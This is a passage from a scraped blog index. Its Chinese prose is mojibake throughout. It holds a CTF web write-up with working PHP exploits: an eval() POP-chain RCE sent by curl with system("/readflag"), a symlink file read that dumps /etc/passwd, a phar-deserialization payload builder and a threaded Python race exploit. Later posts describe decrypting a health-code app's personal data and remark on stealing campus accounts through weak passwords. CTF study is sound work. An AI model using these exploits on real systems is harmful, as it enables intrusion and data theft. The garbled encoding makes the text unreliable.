&quot;&lt;/td&gt;&lt;/tr&gt;\\n&quot;; &#125; echo &quot;&lt;/tbody&gt;\\n&quot;;&#125; renderTableBody() -&gt; renderTableRow() -&gt; evaluateExpression() å‡½æ•°evaluateExpression()åœ¨Base.phpä¸­ 1234567891011121314public function evaluateExpression($_expression_,$_data_=array())&#123; echo $_expression_.&quot; &quot;.var_dump($_data_).&quot;&lt;hr /&gt;&quot;; if(is_string($_expression_)) &#123; extract($_data_); return eval(&#x27;return &#x27;.$_expression_.&#x27;;&#x27;); &#125; else &#123; $_data_[]=$this; return call_user_func_array($_expression_, $_data_); &#125;&#125; å¯ä»¥çœ‹åˆ°æœ€ç»ˆç›®çš„æ˜¯è°ƒç”¨å‡½æ•°ä¸­evaluateExpression()çš„å‡½æ•°eval()ä»¥é€ æˆRCE é‚£ä¹ˆå¯ä»¥æ„é€ å‡ºä¸€ä¸ªPOPé“¾ $template = &quot;&#123;TableBody&#125;&quot; ç»è¿‡POPé“¾run() -&gt; renderContent() -&gt; renderSection()å åˆ°è¾¾å‡½æ•°renderTableBody() è¿™é‡Œæœ‰count($data)ï¼Œç„¶åè¿›è¡Œè¿­ä»£è¿è¡Œå‡½æ•°renderTableRow() æ‰€ä»¥éœ€è¦ $data = 1 åˆ°è¾¾å‡½æ•°renderTableRow()åï¼Œæœ‰ä¸¤æ¡è·¯å¯ä»¥è¿›å…¥å‡½æ•°evaluateExpression() è¿™é‡Œæˆ‘èµ°çš„æ˜¯ç¬¬ä¸€æ¡è·¯ï¼Œåªéœ€è¦æŠŠrowHtmlOptionsExpressionè®¾ç½®ä¸ºä¸ä¸ºNULLå³å¯ è¿›å…¥å‡½æ•°evaluateExpression()åå°±ä¼šç›´æ¥eval($rowHtmlOptionsExpression) æ‰€ä»¥æ”¾å‘½ä»¤å³å¯ $rowHtmlOptionsExpression = &quot;system(\\&quot;/readflag\\&quot;)&quot; å›åˆ°å¼€å¤´çš„ä¸¤ä¸ªå‚æ•°ï¼Œä»£å…¥ä¸Šè¿°å‚æ•°å³å¯è·å¾—flag 12curl http://aa876c17-0ddb-43f7-978e-1ca06b58fe7e.node4.buuoj.cn:81/?action=TestView --data &#x27;properties[template]=&#123;TableBody&#125;&amp;properties[data]=0&amp;properties[rowHtmlOptionsExpression]=system(&quot;/readflag&quot;)&#x27; | grep flagflag&#123;e2fec3cf-a368-45da-9277-2f21aa384a78&#125; é˜Ÿå‹æœ¬æ¥RCEæˆåŠŸäº†ï¼ŒhackerbaræŠŠphpinfoæŒ¡ä½äº†ï¼Œä»¥ä¸ºæ²¡RCEå‡ºæ¥â€¦ soeasy_php ç»™çš„é™„ä»¶æ˜¯ä¸ªdockerfileï¼Œæ²¡å•¥ç”¨æ„Ÿè§‰ è¿›æ¥å°±æ˜¯ä¸ªä¸Šä¼ ç‚¹ï¼Œä½†æ˜¯æˆ‘ä¸Šä¼ äº†ä¸ªphpåç»™æˆ‘çš„ä¸Šä¼ è·¯å¾„åç¼€æ˜¯pngæˆ‘å°±è§‰å¾—ä¸å¯¹äº† F12æŸ¥çœ‹æºç å¯ä»¥çœ‹åˆ°è¿˜æœ‰ä¸ªç¼–è¾‘å¤´åƒåŠŸèƒ½ å°è¯•å°†å¤´åƒæ¢ä¸ºå…¶ä»–æ–‡ä»¶ 1234567891011121314151617181920212223curl http://45632cf4-8a41-4ab2-bf06-65db1ccc6307.node4.buuoj.cn:81/edit.php --data &#x27;png=/etc/passwd&amp;flag=&#x27;æˆåŠŸæ›´æ¢å¤´åƒcurl http://45632cf4-8a41-4ab2-bf06-65db1ccc6307.node4.buuoj.cn:81/uploads/head.pngroot:x:0:0:root:/root:/bin/bashdaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologinbin:x:2:2:bin:/bin:/usr/sbin/nologinsys:x:3:3:sys:/dev:/usr/sbin/nologinsync:x:4:65534:sync:/bin:/bin/syncgames:x:5:60:games:/usr/games:/usr/sbin/nologinman:x:6:12:man:/var/cache/man:/usr/sbin/nologinlp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologinmail:x:8:8:mail:/var/mail:/usr/sbin/nologinnews:x:9:9:news:/var/spool/news:/usr/sbin/nologinuucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologinproxy:x:13:13:proxy:/bin:/usr/sbin/nologinwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologinbackup:x:34:34:backup:/var/backups:/usr/sbin/nologinlist:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologinirc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologingnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologinnobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin_apt:x:100:65534::/nonexistent:/bin/false ç„¶åå°±è¯»æºç äº† 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849#edit.php&lt;?phpini_set(&quot;error_reporting&quot;,&quot;0&quot;);class flag&#123; public function copyflag()&#123; exec(&quot;/copyflag&quot;); //ä»¥rootæƒé™å¤åˆ¶/flag åˆ° /tmp/flag.txtï¼Œå¹¶chown www-data:www-data /tmp/flag.txt echo &quot;SFTQL&quot;; &#125; public function __destruct()&#123; $this-&gt;copyflag(); &#125;&#125;function filewrite($file,$data)&#123; unlink($file); file_put_contents($file, $data);&#125;if(isset($_POST[&#x27;png&#x27;]))&#123; $filename = $_POST[&#x27;png&#x27;]; if(!preg_match(&quot;/:|phar|\\/\\/|php/im&quot;,$filename))&#123; $f = fopen($filename,&quot;r&quot;); $contents = fread($f, filesize($filename)); if(strpos($contents,&quot;flag&#123;&quot;) !== false)&#123; filewrite($filename,&quot;Don&#x27;t give me flag!!!&quot;); &#125; &#125; if(isset($_POST[&#x27;flag&#x27;])) &#123; $flag = (string)$_POST[&#x27;flag&#x27;]; if ($flag == &quot;Give me flag&quot;) &#123; filewrite(&quot;/tmp/flag.txt&quot;, &quot;Don&#x27;t give me flag&quot;); sleep(2); die(&quot;no no no !&quot;); &#125; else &#123; filewrite(&quot;/tmp/flag.txt&quot;, $flag); //ä¸ç»™æˆ‘çœ‹æˆ‘è‡ªå·±å†™ä¸ªflagã€‚ &#125; $head = &quot;uploads/head.png&quot;; unlink($head); if (symlink($filename, $head)) &#123; echo &quot;æˆåŠŸæ›´æ¢å¤´åƒ&quot;; &#125; else &#123; unlink($filename); echo &quot;éæ­£å¸¸æ–‡ä»¶ï¼Œå·²è¢«åˆ é™¤&quot;; &#125;; &#125;&#125; ä¸€çœ¼ååºåˆ—åŒ–ï¼Œä½†æ˜¯åŠå¤©æ²¡çœ‹è§å‡½æ•°unserialize() ç¿»äº†ç¿»ç¬”è®°æ‰æƒ³èµ·æ¥è¿™ç©æ„æ˜¯pharååºåˆ—åŒ– é€šè¿‡æ–‡ä»¶å‡½æ•°æ¥è§¦å‘ååºåˆ—åŒ– è¿™é‡Œå¯ä»¥è§¦å‘çš„æœ‰ fopen() file_put_contents() unlink() é¦–å…ˆå‚æ•°pngçš„æ­£åˆ™ç»•ä¸è¿‡å»ï¼Œåé¢ä¸¤ä¸ªå‡½æ•°filewrite()å‚æ•°å®šæ­»ï¼Œå‡½æ•°unlink($head)å‚æ•°å®šæ­» é‚£å°±å‰©ä¸‹æœ€åä¸€ä¸ªå‡½æ•°unlink($filename)äº† è€Œæ‰§è¡Œå‡½æ•°unlink($filename)éœ€è¦å‡½æ•°symlink($filename, $head) å°è¯•ç»™filenameå¡ä¸ªæ•°ç»„è¿›å»ï¼Œsymlinkç¡®å®å¯„äº†ï¼Œä½†æ˜¯unlinkä¹Ÿå¯„äº† æƒ³æ¥æƒ³å»è¿˜æ˜¯åªèƒ½ç«äº‰symlinkäº† åªè¦æˆ‘è¯·æ±‚å¤Ÿå¿«ï¼Œå°±ä¼šæœ‰ä¸¤ä¸ªPHPçº¿ç¨‹åœ¨unlink($head)ä¹‹åæ‰§è¡Œsymlink($filename, $head) ä½†æ˜¯symlink()ä¸èƒ½åˆ›å»ºåŒåé“¾æ¥ï¼Œæ‰€ä»¥æ…¢çš„é‚£ä¸ªä¼šFalseï¼Œç„¶åè¿è¡Œunlink($filename)ï¼Œå³è§¦å‘pharååºåˆ—åŒ– å³ä½¿è§¦å‘äº†pharååºåˆ—åŒ–ï¼Œflagå†…å®¹è¢«å†™å…¥åˆ°äº†/tmp/flag.txt è¦è¯»å–flagå¿…å®šè¦symlink(&quot;/tmp/flag.txt&quot;, &quot;uploads/head.png&quot;)ï¼Œç„¶åè®¿é—®head.png ä½†åœ¨æ­¤ä¹‹å‰ï¼Œä¼šæ‰§è¡Œfilewrite(&quot;/tmp/flag.txt&quot;, &quot;Don't give me flag&quot;);æˆ–filewrite(&quot;/tmp/flag.txt&quot;, $flag); ä¹Ÿå°±æ˜¯è¯´/tmp/flag.txtä¼šè¢«è¦†å†™ï¼Œæ‰€ä»¥éœ€è¦å†è¿›è¡Œä¸€æ¬¡ç«äº‰ ä½†æ˜¯ä»æ€»ä½“æµç¨‹ä¸Šæ¥è®²ï¼Œè¿™ä¸¤æ¬¡ç«äº‰å®Œå…¨å¯ä»¥æ”¾ä¸€èµ·ï¼Œä»¥è¾¾åˆ°ä»¥ä¸‹ç«äº‰æ•ˆæœ 123456è¦†å†™é”™è¯¯flag -&gt;symlinké“¾æ¥pharæ–‡ä»¶ -&gt;symlinkç«äº‰è§¦å‘unlink(phar) -&gt;è¦†å†™æ­£ç¡®flag -&gt;symlinké“¾æ¥&#x2F;tmp&#x2F;flag.txt -&gt;è¯»å–æ­£ç¡®flag è¿™ä¸ªæ€è·¯çœ‹èµ·æ¥æœ‰ç‚¹å¤©æ–¹å¤œè°­ï¼Œä½†æ˜¯è¿˜æ˜¯èƒ½ç«äº‰å‡ºæ¥çš„ ï¼ˆè¿™é¢˜åšå‡ºæ¥çš„æ—¶å€™æ€»æ„Ÿè§‰è‡ªå·±æ˜¯éé¢„æœŸè§£æ³•ï¼‰ 123456789101112131415161718192021&lt;?php#php.ini: phar.readonly = Offclass flag&#123; public function copyflag()&#123; exec(&quot;/copyflag&quot;); //ä»¥rootæƒé™å¤åˆ¶/flag åˆ° /tmp/flag.txtï¼Œå¹¶chown www-data:www-data /tmp/flag.txt echo &quot;SFTQL&quot;; &#125; public function __destruct()&#123; $this-&gt;copyflag(); &#125;&#125;$a = new flag();$phar = new Phar(&quot;exp.phar&quot;); //åç¼€åå¿…é¡»ä¸ºphar$phar-&gt;startBuffering();$phar-&gt;setStub(&quot;&lt;?php __HALT_COMPILER();?&gt;&quot;); //è®¾ç½®stub$phar-&gt;setMetadata($a); //å°†è‡ªå®šä¹‰çš„meta-dataå­˜å…¥manifest$phar-&gt;addFromString(&quot;exp.txt&quot;, &quot;test&quot;); //æ·»åŠ è¦å‹ç¼©çš„æ–‡ä»¶$phar-&gt;stopBuffering();//ç­¾åè‡ªåŠ¨è®¡ç®—?&gt; 1234567891011121314151617181920212223242526import requestsimport threadingreq = requests.session()url1 = &quot;http://270056b0-3eb6-4a8e-afc5-b70bdf3e8f4b.node4.buuoj.cn:81/uploads/head.png&quot;url2 = &quot;http://270056b0-3eb6-4a8e-afc5-b70bdf3e8f4b.node4.buuoj.cn:81/edit.php&quot;def unlink(): req.post(url2, data=&#123;&quot;png&quot;:&quot;phar:///var/www/html/uploads/01908b979c3dea9fc658e68ab8c560e4.png&quot;, &quot;flag&quot;:&quot;&quot;&#125;)def symlink(): req.post(url2, data=&#123;&quot;png&quot;:&quot;/tmp/flag.txt&quot;, &quot;flag&quot;:&quot;&quot;&#125;)if __name__ == &quot;__main__&quot;: for _ in range(10): t1 = threading.Thread(target=unlink, args=()) t2 = threading.Thread(target=symlink, args=()) t1.start() t2.start() while True: #getflag flag = req.get(url1).text if &quot;flag&quot; in flag: print(flag) break 12python exp.pyflag&#123;eea59afa-414d-4045-8d7f-808abc804951&#125; ä¸¤ä¸ªé¢˜åšäº†äº”ä¸ªå°æ—¶ï¼Œåªèƒ½æ˜å¤©æ‰“æ¸¸æˆäº†","categories":[{"name":"WriteUp","slug":"WriteUp","permalink":"https://yoloyolo.top/categories/WriteUp/"}],"tags":[{"name":"Web","slug":"Web","permalink":"https://yoloyolo.top/tags/Web/"},{"name":"PHP","slug":"PHP","permalink":"https://yoloyolo.top/tags/PHP/"},{"name":"POP","slug":"POP","permalink":"https://yoloyolo.top/tags/POP/"},{"name":"Unserialize","slug":"Unserialize","permalink":"https://yoloyolo.top/tags/Unserialize/"}]},{"title":"é—½ç›¾æ¯/é»‘ç›¾æ¯ 2021 WP","slug":"MinDunCup-2021","date":"2021-12-07T08:16:04.000Z","updated":"2022-05-14T16:00:19.000Z","comments":true,"path":"2021/12/07/MinDunCup-2021/","link":"","permalink":"https://yoloyolo.top/2021/12/07/MinDunCup-2021/","excerpt":"","text":"2/13 ä½†æ˜¯è¿˜æ˜¯è§‰å¾—è‡ªå·±èœå¾—è¦æ­» ç¦å»ºçœç¬¬äºŒå±Šâ€œé—½ç›¾æ¯â€ç½‘ç»œç©ºé—´å®‰å…¨å¤§èµ›é»‘ç›¾èµ›é“WP","categories":[{"name":"WriteUp","slug":"WriteUp","permalink":"https://yoloyolo.top/categories/WriteUp/"}],"tags":[{"name":"Pentest","slug":"Pentest","permalink":"https://yoloyolo.top/tags/Pentest/"},{"name":"Windows","slug":"Windows","permalink":"https://yoloyolo.top/tags/Windows/"},{"name":"Cyber_Attribution","slug":"Cyber-Attribution","permalink":"https://yoloyolo.top/tags/Cyber-Attribution/"}]},{"title":"Xé—½å¥åº·ç åˆ†æ","slug":"X-Min-Health-Code","date":"2021-11-16T03:35:58.000Z","updated":"2022-06-27T18:16:01.000Z","comments":true,"path":"2021/11/15/X-Min-Health-Code/","link":"","permalink":"https://yoloyolo.top/2021/11/15/X-Min-Health-Code/","excerpt":"å±äºæ˜¯ç™½å¿™æ´»äº†ï¼Œä½†æ²¡å®Œå…¨ç™½å¿™æ´»","text":"å±äºæ˜¯ç™½å¿™æ´»äº†ï¼Œä½†æ²¡å®Œå…¨ç™½å¿™æ´» èµ·å› æ˜¯æŸä¸ªé€‰ä¿®è¯¾çš„è€å¸ˆè§‰å¾—æˆ‘è¿™ä¸ªè¯†åˆ«å£ç½©è‡ªåŠ¨å¼€å…³é—¨çš„é¡¹ç›®å¤ªç®€å•äº†ï¼Œäº‹å®ä¸Šæˆ‘ä¹Ÿè§‰å¾—å¾ˆç®€å•ï¼Œç”šè‡³è‡ªåŠ¨å¼€å…³é—¨æˆ‘éƒ½æƒ³ç”¨åªä¸€ä¸ªè¢«é©±åŠ¨çš„å¼‚æ­¥ç”µæœºç³Šå¼„è¿‡å» åæ¥æƒ³ç€åŠ ç‚¹æ´»ï¼Œç„¶åæƒ³åˆ°äº†å»åŒ»é™¢ä½“æ£€çš„æ—¶å€™ï¼ŒåŒ»é™¢é—¨å£çš„é—¨ç¦æ˜¯è¯†åˆ«å£ç½©+æ‰«Xé—½å¥åº·ç  æ‰€ä»¥å°±æƒ³ç€å¯èƒ½Xé—½å¥åº·ç çš„å†…å®¹åº”è¯¥æŒºå¥½è§£æçš„ æˆªå›¾åä¸¢ç›´æ¥å¾®ä¿¡æ‰«ä¸€æ‰«ï¼Œå’Œæˆ‘æƒ³å¾—ä¸€æ¨¡ä¸€æ ·çš„Base64ç¼–ç  ä¼ åˆ°ç”µè„‘ä¸Šè§£ç çš„æ—¶å€™èšŒåŸ ä½äº†ï¼Œä¼°è®¡æ˜¯åŠ å¯†äº†ï¼Œæ ¼å¼å¦‚ä¸‹ â€œMZTJKM_â€ + 236å­—èŠ‚Base64ç¼–ç  + â€œ#|â€ + ç²¾ç¡®åˆ°æ¯«ç§’çš„Unixæ—¶é—´æˆ³ æ‰€ä»¥å°±æƒ³ç€å»æŠŠä¸­é—´çš„Base64è§£å‡ºæ¥ ç„¶åå‡­ç€ä¸Šæ¬¡ä¸”ä»…ä¸€æ¬¡çš„ä¸‰ä¸ªæœˆå‰æ¸—é€APPçš„æ¨¡ç³Šè®°å¿† æ‰“å¼€jadxï¼Œå…ˆçœ‹çœ‹æœ‰æ²¡æœ‰åŒå‘è®¤è¯ï¼Œå¾ˆåº†å¹¸æ˜¯&quot;é›¶å‘è®¤è¯&quot; æœç´¢å…³é”®å­—&quot;AES&quot;ï¼Œç„¶åæ‰¾äº†åŠå¤©çš„å¯†é’¥ æ¢äº†&quot;CBC&quot;æœç´¢ï¼Œç„¶åè¿˜æ‰¾åˆ°äº†3DESçš„ç®—æ³• æ„Ÿè§‰ä¸å¯¹åŠ²äº† æƒ³åŠæ³•æŠ“æ‰‹æœºAPPçš„åŒ…ï¼Œä¸€é€šçæ‘ç‚¹å‡ºäº†ä¸ªè¯·æ±‚Xé—½å¥åº·ç çš„HTTPè¯·æ±‚ï¼Œè™½è¯´åé¢å†ä¹Ÿæ²¡æ‘å‡ºæ¥è¿‡äº† ç„¶åæˆ‘æ‹¿ç€HTTPè¯·æ±‚çš„URLå›jadxæ¥ç€æœç´¢ï¼Œç„¶åæµªè´¹äº†ä¸€ä¸ªå°æ—¶ åæ¥æˆ‘æ‰æƒ³åˆ°ï¼Œè¿™APPå°±æ˜¯ä¸ªå£³å­ç½¢äº† äºŒç»´ç çš„å†…å®¹å®é™…ä¸Šè¿˜æ˜¯Serverç»™çš„ è€Œä¸”è¯·æ±‚çš„URLä¸åœ¨APPé‡Œé¢è€Œæ˜¯åœ¨HTMLé¡µé¢é‡Œ ç„¶åå¼€F12çœ‹JSå»äº†ï¼Œå±å®æ˜¯æœ‰ç‚¹åç‰¢ çœ‹åˆ°åé¢çœ‹åˆ°äº†ä¸ª&quot;decrypt&quot;çš„å­—æ ·ï¼Œæ„Ÿè§‰æœ‰æˆ è·Ÿè¿›ä¹‹åå°±æ˜¯æ··æ·†çš„JSï¼Œæ­¤æ—¶æ„Ÿè§‰å·®ä¸å¤šå¯„äº† å…ˆæŠŠJSåæ··æ·†ä¸€ä¸‹å¤§æ¦‚çœ‹çœ‹ ç„¶åæŠŠæ··æ·†çš„ä»£ç ä¸¢consoleé‡Œï¼ŒæŒ¨ä¸ªè·‘è¢«æ··æ·†çš„è§£å¯†å‚æ•° ç„¶åä»ä¹‹å‰Xé—½å¥åº·ç HTTPå“åº”çš„jsoné‡Œæ‰’æ‹‰å‡ºæ¥data è§£å¯†ä¹‹åå¾—åˆ°äº†å§“åï¼Œèº«ä»½è¯å·ï¼Œå¥åº·çŠ¶æ€ï¼Œè¿˜æœ‰äºŒç»´ç çš„æ–‡æœ¬å½¢å¼ï¼ˆæ²¡æœ‰åé¢çš„æ—¶é—´æˆ³ï¼Œæ—¶é—´æˆ³æ˜¯jså¦å¤–åŠ çš„ï¼‰ç­‰ æŒºæœ‰æ„æ€éƒ½ï¼Œæ–°ç”Ÿæ¯å¯†ç å­¦å‹è½´å°±å‡ºè¿™ä¸ªäº† åˆ°å¤´æ¥Xé—½å¥åº·ç çš„å†…å®¹è¿˜æ˜¯ä¸çŸ¥é“å’‹è§£æ å›å¤´æƒ³æƒ³å»åŒ»é™¢æ‰«å¥åº·ç çš„è¿‡ç¨‹ è¦ä¹ˆæ˜¯åŒ»é™¢çš„é—¨ç¦å†…ç½®äº†Xé—½å¥åº·ç çš„è§£å¯†å‡½æ•°ï¼Œèƒ½è¿›ä¸€æ­¥æå–é‡Œé¢çš„ä¿¡æ¯ è¦ä¹ˆé‚£ç©æ„å°±æå–äºŒç»´ç çš„æ–‡æœ¬ååŒ¹é…&quot;^MZTJKM_[0-9a-zA-Z+/=]{236}#|[0-9]{13}$&quot; ä½†æ˜¯è¦æ˜¯æœ‰äººæ‹¿ä¸ªçº¢ç èƒ½è¿›å»å—ï¼Œåº”è¯¥ä¸è¡Œ æ‰€ä»¥å¯èƒ½æ‰«ç æœ‰ä¸ªé¢œè‰²è¯†åˆ«ï¼Œè¿™ä¸ªæˆ‘å°±ä¸ä¼šäº† åæ¥åˆåˆ†æäº†ä¸‹ 16å­—èŠ‚çš„åˆ†ç»„åŠ å¯†ï¼Œåˆ†ç»„åŠ å¯†æ–¹å¼æ˜¯ECB æˆ‘ä¸€å¼€å§‹ä»¥ä¸ºåº”è¯¥æ˜¯AESï¼Œåæ¥è·Ÿè€å¸ˆè®¨è®ºçš„æ—¶å€™è¯´è¿™ç§æ”¿åºœçš„é¡¹ç›®åº”è¯¥æ˜¯å›½å¯†SM4ä¹‹ç±»çš„ æ ¹æ®æˆ‘çš„çŒœæµ‹ï¼Œä¸­é—´å­˜åœ¨ä¸€æ®µåœ¨å›ºå®šä½ç½®å˜åŠ¨çš„22å­—èŠ‚Base64ç¼–ç ï¼Œæ¢ç®—ä¸‹æ¥è§£ç åæ­£å¥½å·®ä¸å¤š16å­—èŠ‚ HTTPå“åº”é‡Œä¹Ÿæœ‰ä¸ª12å­—èŠ‚çš„response_codeä¼šå˜åŠ¨,æ‰€ä»¥è¿™éƒ¨åˆ†ä¸€ç›´å˜åŠ¨çš„16å­—èŠ‚å¤§æ¦‚ç‡æ˜¯å¯¹åº”response_code å‰©ä¸‹4å­—èŠ‚å¯ä»¥æšä¸¾ï¼Œä½†æ˜¯å­˜åœ¨5ç§ä½ç½®åˆ†å¸ƒçš„æƒ…å†µ å·®ä¸å¤š(96 ** 4) * 5ç§å¯èƒ½ è€Œä¸”å°±ç®—æšä¸¾å‡ºäº†å…¨éƒ¨çš„å¯èƒ½ï¼Œä¹Ÿæ²¡åŠæ³•é€šè¿‡æ˜æ–‡ä¸å¯†æ–‡æ¥è¿˜åŸå‡ºå¯†é’¥ï¼Œçˆ†ç ´16å­—èŠ‚çš„å¯†é’¥æ›´ä¸å¯èƒ½äº†ï¼Œå¾—çˆ†ç ´(256 ** 16) * (96 ** 4) * 5æ¬¡ï¼Œèƒ½çˆ†ç ´å‡ºæ¥(96 ** 4) * 5ä¸ªå¯†é’¥ï¼Œè€Œä¸”å…¶ä¸­åªæœ‰ä¸€ä¸ªæ˜¯å¯¹çš„ é™¤éæˆ‘æœ‰å°é‡å­è®¡ç®—æœº ä¹Ÿè¿˜æœ‰ç§å¯èƒ½ï¼Œå°±æ˜¯è·Ÿçœäººæ°‘æ”¿åºœå»è°ˆé¡¹ç›®ï¼Œä½†æ˜¯æ²¡è¿™ä¸ªè·¯å­ æ€»ç»“æ¥è¯´å°±æ˜¯ï¼Œå¯„","categories":[{"name":"Talk","slug":"Talk","permalink":"https://yoloyolo.top/categories/Talk/"}],"tags":[{"name":"Unbengable","slug":"Unbengable","permalink":"https://yoloyolo.top/tags/Unbengable/"}]},{"title":"èšŒåŸ çš„ä¸€å¤©","slug":"Unbengable-Day","date":"2021-09-18T02:31:18.000Z","updated":"2022-05-14T16:12:39.000Z","comments":true,"path":"2021/09/17/Unbengable-Day/","link":"","permalink":"https://yoloyolo.top/2021/09/17/Unbengable-Day/","excerpt":"2021.09.16 æ ¹æ®çœŸå®äº‹ä»¶æ”¹ç¼–ï¼Œå¦‚æœ‰é›·åŒï¼Œè¯·åŠ¡å¿…å¯¹å·å…¥åº§","text":"2021.09.16 æ ¹æ®çœŸå®äº‹ä»¶æ”¹ç¼–ï¼Œå¦‚æœ‰é›·åŒï¼Œè¯·åŠ¡å¿…å¯¹å·å…¥åº§ å› ä¸ºç–«æƒ…çš„åŸå› ï¼Œå­¦æ ¡æ”¹ä¸ºä¸Šç½‘è¯¾ æ—©å…«æ˜¯ä¸€èŠ‚çº¿ä¸Šå®è·µè¯¾ï¼Œè¯¾ç¨‹ä¸»é¢˜æ˜¯ç‰©è”ç½‘å®‰å…¨ 07:59çš„é—¹é’Ÿå“äº† è¿æ¥è…¾è®¯ä¼šè®®ä¹‹åä¾¿åŠç¡åŠé†’åœ°å¬è¯¾ è¿™ä¸ªè¯¾æ˜¯ç¬¬ä¸€æ¬¡ä¸Š ç¡®åˆ‡æ¥è¯´æ˜¯ä»ç¬¬ä¸€å‘¨å¼€å§‹ï¼Œä½†æ˜¯ç¬¬ä¸€å‘¨çš„è¯¾å› ä¸ºâ€œæœºæˆ¿è£…ä¿®â€æ‰€ä»¥â€œæš‚æ—¶ä¸ä¸Šâ€ï¼Œé€šçŸ¥æ—¶é—´æ˜¯08:32ï¼Œè·ç¦»ä¸Šè¯¾æ—¶é—´è¿‡å»äº†32åˆ†é’Ÿ ç¬¬äºŒå‘¨çš„è¯¾å› ä¸ºâ€œè¿˜æ²¡æœ‰å¼€å§‹â€æ‰€ä»¥ä¹Ÿä¸ä¸Šäº†ï¼Œé€šçŸ¥æ—¶é—´æ˜¯00:43 ç„¶åè€å¸ˆå¼€å§‹è¯´æœ‰å“ªäº›è¯¾ç¨‹æ–¹å‘å¯ä»¥é€‰ ç‰©è”ç½‘è®¾å¤‡éšç§æ£€æµ‹ æŒ‡çº¹ä¼ªé€  æµè§ˆå™¨æŒ‡çº¹ éšå†™ åŠ å¯† å–è¯ APPéšç§æ£€æµ‹ èº«ä»½ä¼ªè£… æˆ‘å¯»æ€äº†ä¸€ä¸‹ æˆ‘æŠŠä¸Šå­¦æœŸå†™å¾—çƒ‚å°¾Beaconéšå†™æ”¹æ”¹å¾—äº† ç„¶åå°±ç»§ç»­åŠç¡åŠé†’åœ°å¬è¯¾äº† èšŒåŸ ä½äº† åæ¥ä¸€ç›´ä¸çŸ¥é“è¯´å•¥ç©æ„ï¼Œä»–ç»™çš„å‚è€ƒæ–‡æ¡£å¯èƒ½æ¶‰åŠå†…å®¹æ•æ„Ÿï¼Œæ‰€ä»¥ä¼šå‘ä¸€ä¸ªåŠ å¯†çš„å‹ç¼©åŒ…ï¼Œç„¶åå†å‘ä¸€ä¸ªå¯†ç  æˆ‘è§‰å¾—ä»–æœ‰ç‚¹åœ¨è„±è£¤å­æ”¾å± ç„¶åä»–è¯´è®©æˆ‘ä»¬ä¸è¦ä¹±ä¼ è¿™äº›æ–‡ä»¶ï¼Œä»¥é˜²æ­¢è§¦å‘å®¡æŸ¥æœºåˆ¶å¸¦æ¥ä¸å¿…è¦çš„éº»çƒ¦ æˆ‘å¯»æ€ä½ ä¸æ•´ç‚¹æ”¿æ²»æ•æ„Ÿç›‘ç®¡äººå‘˜éƒ½æ‡’å¾—çœ‹ä½ ä¸€çœ¼ ç„¶åå‘äº†ä¸ªå››å·å¤§å­¦å­¦ç”Ÿè¢«é€šæŠ¥ç”¨æ ¡å›­ç½‘æµè§ˆè‰²æƒ…ç½‘ç«™27æ¬¡çš„æˆªå›¾ï¼Œç„¶åè¡¥äº†ä¸€å¥â€œæ¯ä¸ªå­¦æ ¡çš„æ ¡å›­ç½‘éƒ½æœ‰è¿™ä¸ªå®¡æŸ¥æœºåˆ¶â€ æˆ‘ä¸çŸ¥é“ä»–æ˜¯åœ¨å¨æ…‘æˆ‘ä»¬è¿˜æ˜¯ä»–æƒ³è¯´æ ¡å›­ç½‘æœ‰ç›‘ç®¡æœºåˆ¶ æˆ‘å¯»æ€è¿™ç§ä¸œè¥¿å¼€ä¸ªä»£ç†ä¸å°±æ²¡è¿™ä¹ˆå¤šäº‹äº† é€€ä¸€æ­¥æ¥è®²ï¼Œå­¦æ ¡çš„æ ¡å›­ç½‘å¼±å£ä»¤æ³›æ»¥å¾—ä¸æƒ³è¯´äº†ï¼Œç›—ç”¨è´¦å·çš„æ”¶ç›Š/(æˆæœ¬*é£é™©)æ¯”ç‡å¯ä»¥è¯´æ˜¯è¦å¤šé«˜æœ‰å¤šé«˜äº† ç„¶åè¯´å¦‚æœè§¦å‘äº†å®¡æŸ¥æœºåˆ¶ä¸ä»–æ— å…³ æˆ‘é¡¿æ—¶é¡¿æ‚Ÿäº†ï¼Œä»–ä¹‹å‰æ‰€è¯´ä¸€åˆ‡çš„å¯èƒ½åªæ˜¯åœ¨ä¸ºè¿™ä¸€æ­¥åšé“ºå« èšŒåŸ ä½äº† æ‰¯ä¸œæ‰¯è¥¿æ‰¯åˆ°äº†ä¹ç‚¹åŠå°±ä¸æ‰¯äº† æˆ‘èƒ½æ„Ÿè§‰åˆ°ä»–ä¹‹å‰çš„å†…å®¹åœ¨å°½åŠ›åœ°æ‹–æ—¶é•¿ï¼Œå¯èƒ½æ˜¯å› ä¸ºè¿™èŠ‚è¯¾æŒ‰ç…§æ•™å­¦è®¡åˆ’æ˜¯è¦ä¸Šåˆ°11:30 ä½†æ˜¯ä»–çœŸçš„å°½åŠ›äº†ï¼Œå®åœ¨ä¸çŸ¥é“æ‰¯å•¥äº†ï¼Œæ‰€ä»¥è®©æˆ‘ä»¬é€€å‡ºè…¾è®¯ä¼šè®® èšŒåŸ ä½äº† ç„¶åæˆ‘å°±å¼€å§‹ä¸Šç½‘å†²æµª æŸå¥³çºªå§”è¢«äººçˆ†å‡ºæ‰“å¥³æ‹³&amp;éæ³•è·åˆ© å…«å°æ—¶åå°±å‡ºäº†è‡ªæ£€é€šå‘Š è‡ªç½šä¸‰æ¯ä¸äº†äº†ä¹‹ çƒ­å¿ƒç½‘å‹å‘ç£å¯¼ç»„é‚®æƒ³æŠ•é€’é‚®ä»¶å™è¿°æƒ…å†µè¢«æ‹’æ”¶ åè€ŒN**æ¸¸æˆç¤¾åŒºæ¥åˆ°ç”µè¯è¢«è­¦å‘Š â€œæ€»ä¸èƒ½ä»€ä¹ˆéƒ½æŸ¥å§ï¼Œæ²¡å‡†ä¼šæŸ¥å‡ºä»€ä¹ˆæ¥å‘¢â€ äº’è”ç½‘çœŸçš„å¤ªç²¾å½©è¾£ èšŒåŸ ä½äº† æˆ‘ä¸Šç½‘å†²æµªå®Œåå®¤å‹å›æ¥è¯´è¾…å¯¼å‘˜å«æˆ‘å»éš”ç¦» æˆ‘é—®çœŸçš„å‡çš„ ä»–è¯´çœŸçš„ ä¸ºä»€ä¹ˆè¦éš”ç¦»å‘¢ å› 